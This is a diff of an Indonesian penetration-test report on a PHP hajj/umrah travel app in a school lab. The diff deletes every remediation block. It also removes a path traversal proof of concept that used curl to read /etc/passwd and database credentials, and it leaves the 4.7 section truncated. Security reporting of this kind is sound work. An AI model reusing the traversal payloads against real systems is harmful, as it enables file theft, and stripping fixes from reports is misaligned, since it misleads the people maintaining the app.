@@ -291,12 +291,6 @@ Akses URL tersebut di browser → muncul halaman "Index of /UK-PKL_Banjar/UK1/UK
 
 **Severity:** 🟡 **MEDIUM** (CVSS 5.3)
 
-**Remediasi:**
-
-```apache
-Options -Indexes
-```
-
 ### 4.4 Full Path Disclosure via PHP Error (HIGH)
 
 **Deskripsi:**
@@ -337,21 +331,6 @@ on line 2
 
 **Severity:** 🟠 **HIGH** (CVSS 7.5)
 
-**Remediasi:**
-
-```php
-// php.ini (production)
-display_errors = Off
-log_errors = On
-error_log = /path/to/error.log
-```
-
-Perbaiki juga path `require_once`:
-
-```php
-require_once __DIR__ . '/../database/connection.php';
-```
-
 ### 4.5 Business Logic — Validasi No. WhatsApp Lemah (MEDIUM)
 
 **Deskripsi:**
@@ -368,7 +347,7 @@ No HP: 08789          ← hanya 5 digit (minimal 10-15 digit)
 
 → Semua **tersimpan di database**.
 
-**Screenshot `tabel_jamaah.php`:**
+**tabel_jamaah.php:**
 
 ```
 No  NIK           Nama   No HP / WhatsApp
@@ -386,20 +365,14 @@ No  NIK           Nama   No HP / WhatsApp
 
 **Severity:** 🟡 **MEDIUM** (CVSS 5.3)
 
-**Remediasi:**
-
-```php
-if (!preg_match('/^[0-9]{10,15}$/', $no_hp)) {
-    $error = "Nomor HP harus 10-15 digit angka.";
-}
-```
-
 ### 4.6 Information Disclosure via SQL Error (MEDIUM-HIGH)
 
 **Deskripsi:**
 File `tambah_pembayaran.php` mengeksekusi `INSERT INTO pembayaran (..., bukti_transfer, ...)`, tapi **kolom `bukti_transfer` tidak ada** di tabel `pembayaran` aktual. Error yang muncul ditampilkan langsung ke user tanpa sanitasi, membocorkan **nama tabel** dan **nama kolom**.
 
 **URL:** `http://localhost/.../backend/tambah_pembayaran.php`
+
+**Executio:** Buat gagal inputannya.
 
 **Proof of Concept:**
 
@@ -434,99 +407,13 @@ Gagal menyimpan data transaksi: SQLSTATE[42S22]: Column not found:
 
 **Severity:** 🟠 **MEDIUM-HIGH** (CVSS 6.5)
 
-**Remediasi:**
-
-```php
-try {
-    // ... INSERT query
-} catch (PDOException $e) {
-    error_log($e->getMessage());  // Log ke file
-    $errorMessage = "Terjadi kesalahan saat menyimpan data.";  // Pesan generik
-}
-```
-
-Sinkronkan juga struktur DB dengan source code:
-```sql
-ALTER TABLE `pembayaran` 
-ADD COLUMN `bukti_transfer` VARCHAR(255) DEFAULT NULL;
-```
 
 ### 4.7 Path Traversal (HIGH)
 
 **Deskripsi:**
 Aplikasi memiliki parameter yang tidak divalidasi dengan baik saat mengakses file, memungkinkan penyerang untuk keluar dari direktori yang dituju dan membaca file sensitif di sistem operasi. Kerentanan ini ditemukan pada parameter `file` di `index.php` dan `page` di `frontend/pages/`.
 
-**URL:** `http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Rinjani/index.php?file=../../../../../../etc/passwd`
-
-**Proof of Concept:**
-
-```bash
-# Membaca file /etc/passwd (Linux)
-curl "http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Rinjani/index.php?file=../../../../../../etc/passwd"
-
-# Output:
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-...
-```
-
-```bash
-# Membaca file konfigurasi database
-curl "http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Rinjani/index.php?file=../backend/database/connection.php"
-
-# Output:
-<?php
-$host = 'localhost';
-$db   = 'travel_haji_umroh';
-$user = 'root';
-$pass = '';
-...
-```
-
-**Analisis Source Code:**
-Setelah source code berhasil di-recover via `.git`, ditemukan bahwa `index.php` menggunakan parameter `file` untuk melakukan `include`:
-
-```php
-// index.php (vulnerable)
-$file = $_GET['file'];
-include $file . '.php';
-```
-
-Tidak ada validasi atau whitelist terhadap nilai `$file`, sehingga penyerang bisa menggunakan **directory traversal** (`../`) untuk mengakses file di luar direktori yang seharusnya.
-
-**Dampak:**
-
-- **Membaca file sensitif:** `/etc/passwd`, `connection.php`, file konfigurasi, source code, dll.
-- **Remote Code Execution (RCE):** Jika penyerang bisa meng-upload file berbahaya (misalnya via fitur upload yang lemah) dan kemudian meng-include-nya via Path Traversal.
-- **Information Disclosure:** Membocorkan struktur direktori dan file-file penting.
-
-**Severity:** 🟠 **HIGH** (CVSS 8.6)
-
-**Remediasi:**
-
-1.  **Whitelist file yang diizinkan:**
-    ```php
-    $allowed_pages = ['home', 'about', 'contact', 'login', 'register'];
-    $page = $_GET['page'] ?? 'home';
-
-    if (!in_array($page, $allowed_pages)) {
-        $page = 'home'; // Fallback ke halaman default
-    }
-    include __DIR__ . '/pages/' . $page . '.php';
-    ```
-
-2.  **Gunakan `basename()` untuk menghilangkan path:**
-    ```php
-    $file = basename($_GET['file']);
-    include __DIR__ . '/pages/' . $file . '.php';
-    ```
-
-3.  **Hindari menggunakan input user langsung untuk `include`/`require`.** Gunakan mapping array atau switch-case.
-
-4.  **Batasi akses file** dengan `open_basedir` di `php.ini`:
-    ```ini
-    open_basedir = /var/www/html/UK1-Rinjani/
-    ```
+**URL:** `http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Rinjani/backend/process/`
 
 ## 5. Vektor yang Diuji & Aman
 
